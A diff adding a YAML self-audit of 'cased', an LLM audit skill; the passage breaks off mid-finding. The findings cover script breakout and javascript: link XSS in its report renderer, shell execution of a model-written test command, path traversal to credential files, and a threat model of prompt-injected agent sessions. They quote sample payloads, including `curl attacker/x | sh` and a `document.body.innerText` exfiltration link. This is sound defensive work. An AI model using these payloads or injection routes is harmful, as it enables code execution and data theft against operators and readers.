@@ -1,0 +1,2982 @@
+---
+audit_date: 2026-08-28
+scope: Full-repo self-audit of cased at 2365a3f — src/ (viewer, recon, schemas), evals/ (runner, scorer, fixtures), skills/ (cased + crustoleum), scripts/, test/
+commit: 2365a3f79e49d64a8b47d0de4445a80d206a04b0
+assessment: |
+  cased is a five-month-old, single-author skill whose product is a contract that
+  language models follow, and this self-audit at 2365a3f reads its 42 findings as a
+  pre-publish checklist rather than an incident list. There are no critical findings
+  and three blocking ones, all the same shape: model-authored text reaches an
+  interpreter unescaped. The worst was found by the audit breaking itself: every
+  template slot is filled with string-form String.replace, so a "$'" in one evidence
+  block and a "$`" in one remediation spliced the assembled HTML into itself, and the
+  report.html in this directory has two DOCTYPEs and four closing html tags — no agent
+  caught it and no gate checks the assembled document. Beside it, the renderer drops
+  findings JSON into a <script> element raw, so any audited repository containing the
+  bytes "</script>" — including this one — breaks the interactive report and can execute
+  in the reader's browser; and the eval scorer runs recon.yaml's testing.command through
+  /bin/sh on the operator's machine after the session that could have written it has
+  ended. The other four significant findings are credibility problems for a project that sells
+  mechanical gates: the CI jobs that check bundle drift have aborted before running
+  on every push for 18 days, 29
+  flow-diagram tests are unreachable from `just test`, nine bare catch blocks turn
+  failures into defaults (one of which blesses an audit whose predecessor's findings
+  were never dispositioned), and the shipped bundle strips ~80 packages' license
+  notices. Everything else is the ordinary residue of a fast August — doc drift,
+  duplicated helpers, untested gate branches, open schema objects — and belongs in the
+  backlog, not the release. Six agents, 45 raw findings, four cross-surface duplicates
+  collapsed. Reviewer: 41 reviewed, 35 confirmed, 6 adjusted, 0 disputed, 0 severity
+  overrides, mechanism traced end-to-end on all 41; the adjustments widened two class
+  sweeps (five unescaped sinks, not three; nine bare catches, not four) and corrected
+  three counts and one license inventory. The 42nd finding was filed by the controller
+  after assembly, when the built report turned out to be corrupt, and was sent back to
+  the reviewer on its own.
+narratives:
+  - slug: security-surface
+    title: The Security Surface
+    thesis: cased has no network surface and no secrets, so its security posture is the trust it places in model-authored YAML on its way into HTML and into shells — and that trust is nearly total.
+    verdict: "The report renderer is the real attack surface, and this audit broke it on the way out: every template slot is filled with string-form String.replace, so a `$'` in audited source spliced this report into itself, and one unescaped JSON slot lets any repository containing `</script>` break or script the reader's browser. Three smaller escaping gaps sit beside them. The eval harness runs models with full Bash by design — a documented choice, not a bug — but the scorer executing a model-authored test command through a shell is not. All are small fixes at known interpolation sites, and the first one is the reason report.html in this directory is unreadable."
+    flow:
+      - id: yaml
+        label: Model writes findings.yaml
+        type: start
+      - id: gates
+        label: validate + evidence gates
+        type: process
+        findings:
+          - slug: evidence-gate-reads-outside-the-repo-root
+            label: path escapes repo
+      - id: assemble
+        label: assembleReport()
+        type: process
+        findings:
+          - slug: unescaped-metadata-in-report-markup
+            label: header unescaped
+          - slug: prose-links-allow-javascript-uris
+            label: "javascript: href"
+      - id: slot
+        label: JSON.stringify → <script>
+        type: process
+        findings:
+          - slug: template-slot-replace-interprets-dollar-patterns
+            label: "$' splices document"
+          - slug: report-data-blob-script-breakout
+            label: </script> breakout
+      - id: browser
+        label: Reader opens report.html
+        type: end
+    findings:
+      - slug: report-data-blob-script-breakout
+        title: Model-authored YAML is injected raw into the report's <script> data block
+        concern: significant
+        locations:
+          - path: src/viewer/build-report.mjs
+            start_line: 929
+            end_line: 935
+          - path: src/viewer/viewer.js
+            start_line: 7
+            end_line: 8
+        evidence: |2
+            const html = template
+              .replace('<!-- SLOT:title -->', escHtml(title))
+              .replace('<!-- SLOT:fonts -->', fontFaceDecls)
+              .replace('<!-- SLOT:style -->', allCss)
+              .replace('<!-- SLOT:content -->', contentHtml)
+              .replace('<!-- SLOT:data -->', JSON.stringify(dataBlob))
+              .replace('<!-- SLOT:viewer -->', allJs);
+            const dataEl = document.getElementById('cased-data');
+            const data = dataEl ? JSON.parse(dataEl.textContent) : {};
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: "6"
+            type: del
+            label: JSON.stringify does not escape < or /, so a literal </script> in the data ends the element
+          - lines: "9"
+            type: mark
+            label: unguarded parse of the truncated blob; the value is never read
+        mechanism: |
+          `assembleReport` builds `dataBlob = { recon, findings }` from the two audit
+          YAML files and drops `JSON.stringify(dataBlob)` verbatim into
+          `<script id="cased-data" type="application/json">` in template.html.
+          JSON.stringify escapes quotes and backslashes but never `<` or `/`, and the
+          HTML parser terminates a script element at the first literal `</script`
+          regardless of JSON context. Every string in that blob is model-authored or
+          copied out of the audited repo: evidence blocks are required by the fidelity
+          gate to be verbatim source lines, so auditing any repo containing the byte
+          sequence `</script>` — an HTML template, a JS bundle, a doc example, cased's
+          own src/viewer/template.html — ends the data element early, and everything
+          after it is reparsed as markup. An audited file containing
+          `</script><img src=x onerror=...>` therefore executes in the reader's browser
+          when the report is opened or forwarded. Even with no payload the breakage is
+          certain: the truncated JSON makes JSON.parse at viewer.js:8 throw inside the
+          DOMContentLoaded handler before initAnnotations, initSlides and initNavBar
+          run, so the report silently loses every interactive feature — and the parse
+          buys nothing, because `data` is assigned and never read anywhere in the
+          module. Nothing on this path validates or escapes: `build` never invokes the
+          schema validator (that is the separate `validate` subcommand), and escHtml is
+          applied to the title slot but not the data slot.
+        remediation: |
+          Escape the JSON before interpolation: replace `<`, `>`, `&` and U+2028/U+2029
+          with their \uXXXX forms, which stay valid JSON and are inert to the HTML
+          parser — JSON.stringify(dataBlob).replace(/[<>&  ]/g, c =>
+          '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')). Add a build-time
+          assertion that the assembled HTML contains no stray `</script` inside a slot.
+          In viewer.js either delete the dead parse or wrap it in try/catch so a
+          malformed blob degrades to a static report instead of killing every
+          initializer.
+        temporal:
+          introduced: 2026-04-05
+          last_modified: 2026-08-28
+          commit_count: 11
+          monthly_commits:
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 9
+            - 0
+            - 0
+            - 0
+            - 2
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - unescaped-metadata-in-report-markup
+            - prose-links-allow-javascript-uris
+        effort: small
+        effort_notes: One escaping helper at the interpolation site plus a guard in the viewer entry point.
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: template-slot-replace-interprets-dollar-patterns
+        title: "Every template slot is filled with String.replace, so a `$'` or `` $` `` anywhere in the audit data splices the document into itself"
+        concern: significant
+        locations:
+          - path: src/viewer/build-report.mjs
+            start_line: 929
+            end_line: 935
+        evidence: |2
+            const html = template
+              .replace('<!-- SLOT:title -->', escHtml(title))
+              .replace('<!-- SLOT:fonts -->', fontFaceDecls)
+              .replace('<!-- SLOT:style -->', allCss)
+              .replace('<!-- SLOT:content -->', contentHtml)
+              .replace('<!-- SLOT:data -->', JSON.stringify(dataBlob))
+              .replace('<!-- SLOT:viewer -->', allJs);
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: "2-7"
+            type: del
+            label: "string-form replace: the replacement is parsed for $&, $`, $', $$, $n — never literal"
+        mechanism: |
+          `String.prototype.replace(pattern, replacementString)` does not insert the
+          replacement literally: it interprets `$&` (the match), `` $` `` (everything
+          before the match), `$'` (everything after the match), `$$` and `$<n>`. All six
+          slots here are filled that way, and the two that carry model-authored data are
+          the ones that matter. `contentHtml` is rendered evidence and prose;
+          `JSON.stringify(dataBlob)` is the entire findings document. Any finding whose
+          evidence or prose contains a dollar sign followed by a backtick or an
+          apostrophe — a shell regex anchor like `[^/]+\.svg)$'`, a JSON-Schema pattern
+          like `` `^[A-Z]+-[0-9]+$` `` — is enough. This audit is the proof: its own
+          findings.yaml contained both sequences before this finding existed (in the
+          `hygiene-gate-swallows-git-failure` evidence and the
+          `contract-fields-absent-from-schema` remediation), and the first report.html
+          built from it had two `<!DOCTYPE>`s, four `</html>`s, four
+          `<script id="cased-data">` blocks still holding the literal `<!-- SLOT:data -->`,
+          six orphaned `<!-- SLOT:viewer -->` markers, and weighed 1.3 MB where the
+          template is 759 bytes plus content. Writing this finding added more such sequences to the
+          data; the rebuild has 30 DOCTYPEs, 101 `</html>`s and 9.4 MB, because every
+          splice re-inserts a document that already contains the trigger. Nothing in `build`, `validate`, or `finalize` inspects the
+          assembled HTML, so the corrupted deliverable ships silently. This is the sibling
+          of `report-data-blob-script-breakout` one layer earlier in the same statement:
+          that finding is about the HTML parser reading the JSON; this one is about the
+          JavaScript runtime rewriting the document before the parser ever sees it.
+          Reachability is total — the trigger is a dollar sign in audited source, which is
+          ordinary in shell, Perl, PHP, Makefiles, regexes and template languages.
+        remediation: |
+          Never pass model-authored text as a string replacement. Use the function form,
+          which inserts literally: `.replace('<!-- SLOT:data -->', () => json)` — for all
+          six slots, since `allCss`/`allJs` are safe today only by accident. Then add the
+          assertion that belongs in `build`: after assembly, the HTML must contain exactly
+          one `<!DOCTYPE`, no remaining `<!-- SLOT:` marker, and the `cased-data` element
+          must `JSON.parse`; fail the build otherwise. Add a unit test that assembles a
+          findings document containing `$'`, `` $` `` and `$&` and asserts byte-for-byte
+          that they survive. This audit's own `record/audits/2026-08-28-21-self-audit/`
+          is the regression fixture. The fix is not done until the bundle is rebuilt
+          (`scripts/build-viewer.sh`, then `just check-bundle`): the shipped
+          `skills/cased/scripts/build-report.js:40775` carries the identical chain and is
+          the code path every skill user actually executes — patching only the `.mjs`
+          source fixes nothing for them.
+        temporal:
+          introduced: "2026-04-05"
+          last_modified: "2026-08-28"
+          commit_count: 11
+          monthly_commits: [0, 0, 0, 0, 0, 0, 0, 9, 0, 0, 0, 2]
+        chains:
+          enables: []
+          enabled_by: []
+          related: [report-data-blob-script-breakout, summary-counts-never-cross-checked]
+        effort: trivial
+        effort_notes: "Six replacement arguments become arrow functions; the post-assembly assertion is a dozen lines."
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: eval-scorer-shells-out-model-authored-test-command
+        title: The eval scorer executes recon.yaml's testing.command through a shell
+        concern: significant
+        locations:
+          - path: src/recon/recon-to-yaml.mjs
+            start_line: 313
+            end_line: 322
+          - path: evals/scripts/score-eval.mjs
+            start_line: 256
+            end_line: 257
+          - path: evals/scripts/score-eval.mjs
+            start_line: 301
+            end_line: 307
+        evidence: |
+          export function detectTesting(targetPath) {
+            // Priority 1: scrat config commands.test
+            const scratResult = detectScratTest(targetPath);
+            if (scratResult) {
+              return finalizeTesting({
+                command: scratResult.command,
+                sources: [scratResult.source],
+                targetPath,
+              });
+            }
+            const citedCommand = recon?.testing?.command ?? remediation.test_command ?? testCommand ?? null;
+            const gateCommand = testCommand ?? recon?.testing?.command ?? remediation.test_command ?? null;
+            let gatePass = false;
+            if (gateCommand) {
+              try {
+                execFileSync(gateCommand, { cwd: repoRoot, shell: true, stdio: 'ignore' });
+                gatePass = true;
+              } catch { gatePass = false; }
+            }
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: "6"
+            type: mark
+            label: verbatim string from the target repo's scrat config
+          - lines: "12"
+            type: mark
+            label: falls back to recon.yaml when --test-command is absent
+          - lines: "16"
+            type: del
+            label: "shell: true hands the whole string to /bin/sh"
+        mechanism: |
+          scoreRemediation runs the project's workspace gate to check that the
+          remediated tree still builds, and executes it with `shell: true`, which makes
+          the entire string a shell command line rather than an argv[0]. gateCommand is
+          the operator's --test-command only when one is passed; run-eval's remediate
+          branch (evals/scripts/run-eval:284-286) passes --mode, --audit-dir,
+          --repo-root and the hidden-test flags but never --test-command, so on every
+          real run the executed string is `recon.yaml#testing.command` read out of the
+          audit directory inside the eval workdir. Two independent writers control that
+          value. First, detectTesting priority 1 copies it verbatim from the target
+          repo's scrat config (commands.test), so a repository under audit chooses the
+          string. Second, the workdir belongs to the headless session under test, which
+          runs with --permission-mode acceptEdits and Write in its allowlist and is
+          explicitly told to author files under record/audits/: a session that writes
+          `command: "just test; curl attacker/x | sh"` gets that line executed by the
+          scorer on the operator's machine, unsandboxed, after the session has ended.
+          This is the only `shell: true` in the workspace — every .mjs/.js was grepped
+          for execSync|execFileSync|spawnSync|child_process; the other two call sites
+          (build-report.mjs:1024, score-eval.mjs:164) invoke git with an argv array and
+          no shell, and build-report.mjs's sha argument is additionally constrained to
+          [0-9a-f]{7,40} by parseLedger.
+        remediation: |
+          Drop `shell: true` and run the gate as an argv array — tokenize the configured
+          command properly, or require the fixture to declare it as a list
+          (test_command: ["just", "test"]). If a shell is genuinely needed for wrapper
+          semantics, take the command only from --test-command or the fixture's
+          expected-findings.yaml (both operator-authored, outside the session's write
+          scope) and never from a recon.yaml the session could edit; log the exact
+          command line before executing it either way.
+        temporal:
+          introduced: 2026-08-10
+          last_modified: 2026-08-28
+          commit_count: 2
+          monthly_commits:
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 2
+        chains:
+          enables: []
+          enabled_by:
+            - eval-runner-drives-unsandboxed-headless-session
+          related: []
+        effort: small
+        effort_notes: One call site; sourcing the argument differently is a few lines across run-eval and score-eval.
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: unescaped-metadata-in-report-markup
+        title: Header metadata and flow-diagram concern labels bypass the HTML escaper
+        concern: moderate
+        locations:
+          - path: src/viewer/build-report.mjs
+            start_line: 356
+            end_line: 357
+          - path: src/viewer/flow-to-svg.js
+            start_line: 107
+            end_line: 108
+          - path: src/viewer/build-report.mjs
+            start_line: 342
+            end_line: 342
+          - path: src/viewer/build-report.mjs
+            start_line: 360
+            end_line: 361
+          - path: src/viewer/build-report.mjs
+            start_line: 472
+            end_line: 472
+        evidence: |2
+                <h1>${escHtml(findings.scope || 'Audit')} Audit</h1>
+                <p class="meta">${findings.audit_date} &middot; <code>${(findings.commit || '').slice(0, 12)}</code> &middot; ${escHtml(findings.scope || '')}</p>
+              parts.push(`<text x="${V.marginTextX}" y="${titleY}" font-size="9" font-weight="600" fill="${style.fill}">${esc(displayTitle)}</text>`);
+              parts.push(`<text x="${V.marginTextX}" y="${badgeY}" font-size="7" fill="${style.badge}" font-weight="500" letter-spacing="0.5">${finding.concern.toUpperCase()}</text>`);
+              .map(([level]) => `<strong>${level}</strong> \u2014 ${defs[level] || level}`)
+          ${Object.entries(counts).filter(([, v]) => v > 0).map(([level, count]) =>
+            `        <span class="summary-count" data-concern="${level}">${count} ${level}</span>`
+                  `<code>${escHtml(loc.path)}:${loc.start_line}</code>`
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: "2"
+            type: del
+            label: audit_date and commit interpolated raw; scope on the same line is escaped
+          - lines: "4"
+            type: del
+            label: concern interpolated raw; displayTitle on the line above is escaped
+          - lines: "5-7"
+            type: del
+            label: summary.counts KEYS — not enum-bound — into a glossary, an attribute, and text
+          - lines: "8"
+            type: mark
+            label: start_line interpolated raw beside an escaped path
+        mechanism: |
+          Both renderers escape their neighbouring fields and skip these three.
+          `findings.audit_date` and `findings.commit` go straight into the header
+          markup, and `finding.concern` goes straight into the flow SVG, while `scope`
+          (same template literal) and `displayTitle` (the line above) are run through
+          escHtml/esc. The safety of these three rests entirely on the schema —
+          audit_date has `format: date`, concern is an enum — but the `build`
+          subcommand never invokes the validator. Schema validation is a separate
+          `validate` subcommand that SKILL.md tells the agent to run in Phase 3a; a run
+          that skips that step, a user invoking `build-report.js <dir>` directly, or a
+          findings.yaml hand-edited between validate and build all reach these sinks
+          with arbitrary strings, and audit_date has no length limit at all (commit is
+          additionally truncated to 12 characters, which limits it to markup corruption
+          rather than script execution). The reviewer's sweep found the class is wider
+          than the finder's "only three": the KEYS of `summary.counts` are interpolated
+          raw into the glossary (`<strong>${level}</strong>`, line 342) and into both an
+          attribute and text in the summary bar (`data-concern="${level}">${count}
+          ${level}`, lines 360-361), and `loc.start_line` goes unescaped into the ledger
+          cell beside an escaped path (line 472). The counts keys are not enum-bound —
+          findings.schema.json leaves `summary.counts` open — so an arbitrary key
+          validates and reaches an attribute sink: a strictly worse position than
+          audit_date, which at least carries `format: date`. Five sinks, not three.
+        remediation: |
+          Wrap all five in the escaper already in scope at each site:
+          escHtml(findings.audit_date), escHtml((findings.commit || '').slice(0, 12)),
+          esc(finding.concern.toUpperCase()), escHtml(level) at both counts sites, and
+          escHtml(loc.start_line). Independently, make `build` run the
+          compiled validators before rendering (or refuse to render an unvalidated
+          document) so the render path stops depending on a process step a model can
+          skip.
+        temporal:
+          introduced: 2026-04-05
+          last_modified: 2026-08-28
+          commit_count: 11
+          monthly_commits:
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 9
+            - 0
+            - 0
+            - 0
+            - 2
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - report-data-blob-script-breakout
+        effort: trivial
+        effort_notes: Three call sites, escapers already imported in both files.
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: prose-links-allow-javascript-uris
+        title: "renderProse emits any URI scheme into href, including javascript:"
+        concern: moderate
+        locations:
+          - path: src/viewer/build-report.mjs
+            start_line: 223
+            end_line: 231
+        evidence: |2
+            const pattern = /\[([^\]]+)\]\(([^)]+)\)|\*\*([^*]+)\*\*|`([^`]+)`/g;
+            let match;
+            while ((match = pattern.exec(str)) !== null) {
+              if (match.index > lastIndex) {
+                tokens.push(escHtml(str.slice(lastIndex, match.index)));
+              }
+              if (match[1] !== undefined) {
+                tokens.push(`<a href="${escHtml(match[2])}">${escHtml(match[1])}</a>`);
+              } else if (match[3] !== undefined) {
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: "8"
+            type: del
+            label: escHtml protects the attribute quoting but not the URI scheme
+        mechanism: |
+          renderProse turns markdown links in model-authored free text into anchors. It
+          is applied to `assessment` and to every finding's `mechanism` and
+          `remediation` (build-report.mjs:358, 448, 452) — all plain `type: string` in
+          findings.schema.json with no pattern, so they survive schema validation
+          intact. escHtml escapes &<>" , which keeps the attribute from breaking out,
+          but performs no scheme check, so
+          `[click](javascript:fetch('https://x/?'+document.body.innerText))` in a
+          subagent's prose renders as a live javascript: link in report.html.
+          Reachability does not require a malicious operator: the audited repository is
+          untrusted input to the analysis agents, and the report is a document that gets
+          opened and forwarded to reviewers who have every reason to trust its links.
+          `data:` and `vbscript:` URIs are equally unfiltered.
+        remediation: |
+          Parse match[2] with `new URL(href, 'https://x.invalid')` inside a try/catch and
+          emit an anchor only for an allowlisted protocol set (http:, https:, mailto:,
+          plus bare fragments and relative paths); otherwise render the link text as
+          escaped plain text. Add rel="noopener noreferrer" while you are there.
+        temporal:
+          introduced: 2026-04-05
+          last_modified: 2026-08-28
+          commit_count: 11
+          monthly_commits:
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 9
+            - 0
+            - 0
+            - 0
+            - 2
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - report-data-blob-script-breakout
+        effort: trivial
+        effort_notes: One allowlist check in a single branch of renderProse.
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: evidence-gate-reads-outside-the-repo-root
+        title: Evidence fidelity gate follows absolute and traversing finding paths
+        concern: moderate
+        locations:
+          - path: src/viewer/gates.mjs
+            start_line: 18
+            end_line: 23
+          - path: src/schemas/findings.schema.json
+            start_line: 60
+            end_line: 62
+        evidence: |
+          function fileLines(repoRoot, p) {
+            const abs = isAbsolute(p) ? p : join(repoRoot, p);
+            if (!existsSync(abs)) return null;
+            const txt = readFileSync(abs, 'utf8');
+            return txt.split('\n');
+          }
+                              "required": ["path", "start_line", "end_line"],
+                              "properties": {
+                                "path": { "type": "string" },
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: "2"
+            type: del
+            label: absolute paths are honoured and join() does not reject ../ escapes
+          - lines: "9"
+            type: mark
+            label: no pattern or relative-path constraint on the schema side
+        mechanism: |
+          checkEvidenceFidelity exists to bind a finding's evidence to the audited
+          source tree, and it is the one gate that reads files named by model-authored
+          YAML: locations[].path. fileLines treats an absolute path as authoritative and
+          resolves everything else with join(), which happily normalises
+          `../../../../etc/passwd`; findings.schema.json puts no pattern or
+          relative-path constraint on `path`, so such a location validates cleanly. The
+          gate then reads the file and, on mismatch, prints the source line back to the
+          operator — build-report.mjs:1000 emits `file: <JSON-quoted file content>` for
+          both `evidence` and `finalize`, and scoreArtifacts surfaces the same problems.
+          An analysis subagent is driven by the contents of the repository under audit,
+          which is untrusted input; a finding citing
+          `/Users/<user>/.aws/credentials:3-3` turns the fidelity gate into a
+          one-line-at-a-time reader for any file the operator can read, and the same
+          path cited with matching evidence gets that content rendered into report.html
+          as a gate-verified evidence block. This gate is the wrong place to trust the
+          model — every other check in gates.mjs exists specifically to stop trusting
+          it.
+        remediation: |
+          Resolve the candidate with resolve(repoRoot, p) and reject anything that does
+          not start with resolve(repoRoot) + sep, pushing a `path-escapes-repo` problem
+          instead of reading the file — the problem list already has the right shape.
+          Reject absolute path values outright, and add a relative-path pattern to
+          locations.items.path in src/schemas/findings.schema.json so the rule is
+          enforced at validate time too, then re-stamp the contract into every
+          consumer's references/ with build-schemas.sh.
+        temporal:
+          introduced: 2026-08-28
+          last_modified: 2026-08-28
+          commit_count: 1
+          monthly_commits:
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 1
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - report-data-blob-script-breakout
+        effort: small
+        effort_notes: One containment check in fileLines plus a schema pattern and a re-stamp.
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: eval-runner-drives-unsandboxed-headless-session
+        title: Eval runs grant unrestricted Bash with no sandbox on the claude platform
+        concern: moderate
+        locations:
+          - path: evals/scripts/run-eval
+            start_line: 138
+            end_line: 142
+          - path: evals/scripts/run-eval
+            start_line: 157
+            end_line: 161
+        evidence: |
+          ALLOWED_TOOLS="Bash,Read,Write,Edit,Glob,Grep,Task,Skill,TodoWrite"
+
+          case "$PLATFORM" in
+            claude)
+              CMD=(claude -p "$PROMPT" --output-format text --permission-mode acceptEdits --allowedTools "$ALLOWED_TOOLS")
+              CMD=(codex exec --skip-git-repo-check -s workspace-write
+                   --ephemeral --ignore-user-config
+                   --enable multi_agent
+                   -c 'sandbox_workspace_write.network_access=true'
+                   "$CODEX_PROMPT")
+        evidence_lang: bash
+        evidence_markers:
+          - lines: "5"
+            type: del
+            label: acceptEdits plus a blanket Bash allowlist, with no filesystem confinement
+          - lines: "6"
+            type: ins
+            label: the codex branch confines the same workload to workspace-write
+        mechanism: |
+          The two platform branches make opposite trust decisions about the same
+          workload. The codex branch runs the session under `-s workspace-write` with
+          --ephemeral --ignore-user-config, deliberately hermetic. The claude branch
+          allowlists `Bash` with no command pattern and sets --permission-mode
+          acceptEdits, so every tool call — including every shell command the session or
+          its subagents choose — is auto-approved with the operator's full user rights,
+          and nothing confines writes to $WORKDIR. The session's job is to read a
+          repository it has never seen and act on what it reads, which is exactly the
+          shape that makes prompt-injected content in a fixture source or an audited
+          tree consequential; the harness then trusts artifacts that session wrote (see
+          eval-scorer-shells-out-model-authored-test-command, which executes one of
+          them). Fixtures are first-party today, which is why this is moderate rather
+          than significant, but the asymmetry with the codex branch shows the
+          confinement question was already answered once for the other platform and left
+          open here.
+        remediation: |
+          Bring the claude branch to the codex branch's posture: narrow --allowedTools to
+          the Bash command prefixes the pipeline actually needs (Bash(cargo:*),
+          Bash(git:*), Bash(node:*), Bash(just:*), Bash(tokei:*)), or run the session
+          inside a sandbox or container rooted at $WORKDIR. Document the residual trust
+          level at the top of run-eval so an operator adding a third-party fixture knows
+          what the harness assumes.
+        temporal:
+          introduced: 2026-08-10
+          last_modified: 2026-08-28
+          commit_count: 8
+          monthly_commits:
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 0
+            - 8
+        chains:
+          enables:
+            - eval-scorer-shells-out-model-authored-test-command
+          enabled_by: []
+          related: []
+        effort: medium
+        effort_notes: The tool-pattern allowlist is quick; verifying a full audit still completes under it is the real cost.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+  - slug: error-handling-surface
+    title: The Error Handling Surface
+    thesis: The CLIs fail loudly at the boundaries they were designed for and silently everywhere else — bare catches, unguarded reads, and exit codes that carry no consistent meaning.
+    verdict: "Nothing here loses data, but several paths turn a diagnosable failure into a default value or a raw stack trace, and one of them — countFindings returning 0 on a parse error — lets finalize bless an audit whose predecessor's findings were never dispositioned. The fixes are mechanical: bind the error, name it, keep the exit code honest."
+    flow:
+      - id: invoke
+        label: build-report.js <cmd> <dir>
+        type: start
+      - id: parse
+        label: parse subcommand
+        type: process
+      - id: read
+        label: read recon + findings
+        type: process
+        findings:
+          - slug: build-subcommand-unguarded-io
+            label: unguarded read
+          - slug: fonts-dir-resolution-unguarded
+            label: fonts undefined
+      - id: gates
+        label: gates + ledger lint
+        type: process
+        findings:
+          - slug: bare-catch-erases-failure-cause
+            label: catch → default
+      - id: exit
+        label: exit code
+        type: end
+        findings:
+          - slug: recon-catch-all-collapses-exit-3
+            label: everything → 3
+    findings:
+      - slug: bare-catch-erases-failure-cause
+        title: Bare catch blocks substitute a default for nine fallible operations, one of which defeats the finalize gate
+        concern: significant
+        locations:
+          - path: src/viewer/prior-audits.mjs
+            start_line: 46
+            end_line: 51
+          - path: src/viewer/build-report.mjs
+            start_line: 1022
+            end_line: 1027
+          - path: src/recon/recon-to-yaml.mjs
+            start_line: 422
+            end_line: 427
+          - path: evals/scripts/score-eval.mjs
+            start_line: 301
+            end_line: 307
+          - path: src/recon/recon-to-yaml.mjs
+            start_line: 417
+            end_line: 419
+          - path: src/recon/recon-to-yaml.mjs
+            start_line: 462
+            end_line: 464
+          - path: src/recon/recon-to-yaml.mjs
+            start_line: 483
+            end_line: 485
+          - path: evals/scripts/score-eval.mjs
+            start_line: 189
+            end_line: 191
+          - path: evals/scripts/score-eval.mjs
+            start_line: 210
+            end_line: 210
+        evidence: |
+          function countFindings(findingsPath) {
+            try {
+              const doc = parseYaml(readFileSync(findingsPath, 'utf8')) ?? {};
+              return (doc.narratives ?? []).reduce((n, nar) => n + (nar.findings ?? []).length, 0);
+            } catch { return 0; }
+          }
+                const gitLog = sha => {
+                  try {
+                    const out = execFileSync('git', ['-C', root, 'log', '-1', '--format=%(trailers:key=Audit-Finding,valueonly)', sha], { encoding: 'utf8' });
+                    return { exists: true, trailers: out.split('\n').map(s => s.trim()).filter(Boolean) };
+                  } catch { return { exists: false, trailers: [] }; }
+                };
+                try {
+                  const parsed = YAML.parse(raw);
+                  command = parsed?.commands?.test;
+                } catch {
+                  continue;
+                }
+            let gatePass = false;
+            if (gateCommand) {
+              try {
+                execFileSync(gateCommand, { cwd: repoRoot, shell: true, stdio: 'ignore' });
+                gatePass = true;
+              } catch { gatePass = false; }
+            }
+              } catch {
+                continue;
+              }
+              } catch {
+                continue;
+              }
+              }
+            } catch {
+              // Malformed package.json — silent skip; higher-priority detection
+            } catch {
+              // No ledger at baseline (or no baseline tag): every entry is session work.
+            }
+            } catch { return null; } // no baseline tag: not a remediation workdir
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: "5"
+            type: del
+            label: unparseable prior findings.yaml reads as zero findings — the unledgered-prior gate never fires
+          - lines: "26-38"
+            type: mark
+            label: five more of the same shape the finder missed — two of them distort eval scores
+          - lines: "11"
+            type: del
+            label: git absent or broken reads as 'commit not found'
+          - lines: "16"
+            type: mark
+            label: malformed scrat.yaml falls through silently
+          - lines: "23"
+            type: mark
+            label: a gate that never ran scores like a gate that failed
+        mechanism: |
+          Grepping every catch in src/ and evals/scripts/ (12 sites) turns up nine that bind
+          no error, log nothing, and return a value indistinguishable from a legitimate
+          result — the finder cited four; the reviewer's sweep added recon-to-yaml.mjs:417,
+          :462 and :484 (unreadable or malformed config files silently skipped), and
+          score-eval.mjs:189 and :210, which distort eval scores directly: an unreadable
+          baseline ledger makes every entry count as session work, and a git failure in
+          fixCommits returns null so trailers_ok reports 0/0 with zero session commits. The worst is countFindings: prior-audits.mjs exists, per its own header
+          comment, because "a prior audit with findings and no ledger is a process failure —
+          findings evaporate", and finalizeAudit enforces exactly that with `if
+          (p.findingCount > 0 && !p.hasLedger)` (build-report.mjs:816-818). An unparseable or
+          unreadable prior findings.yaml is reported as zero findings, so `build-report.js
+          finalize` exits 0 and blesses an audit whose predecessor's findings were never
+          dispositioned — the gate reports success precisely when its input is broken. The
+          other three degrade quietly in the same way: a git failure (git absent, root not a
+          repo, corrupt object store) is reported to lintLedger as `exists: false`, which
+          renders as the actively misleading "commit <sha> not found in target repo
+          (squash-merge? record the merge SHA)"; a malformed `.config/scrat.yaml` makes recon
+          silently fall through to a lower-priority test-command detector and then publish
+          `testing.sources` naming a file it could not read; and an eval gate command that
+          does not exist (`just` not installed) scores identically to one whose tests failed,
+          silently reporting `workspace_gate_pass: false` for a run that never ran.
+        remediation: |
+          Bind the error in each block and make the failure visible. countFindings should
+          return null on a parse error and finalizeAudit should treat null as an error
+          ("prior audit <slug> has an unreadable findings.yaml"), never as zero. gitLog should
+          distinguish "commit unknown" (git exit 128 with 'unknown revision') from "git could
+          not run" and surface the latter as a lint error naming the git stderr. detectScratTest
+          and detectNpmTest should warn on stderr with the file path and parse message before
+          falling through. scoreRemediation should record the spawn error so
+          `workspace_gate_pass: false` can be told apart from "gate never executed".
+        temporal:
+          introduced: 2026-04-11
+          last_modified: 2026-08-28
+          commit_count: 18
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - finalize-skips-ledger-commit-verification
+        effort: small
+        effort_notes: Four call sites; each needs a bound error and one log or propagation path. The countFindings change also touches its one caller.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+      - slug: build-subcommand-unguarded-io
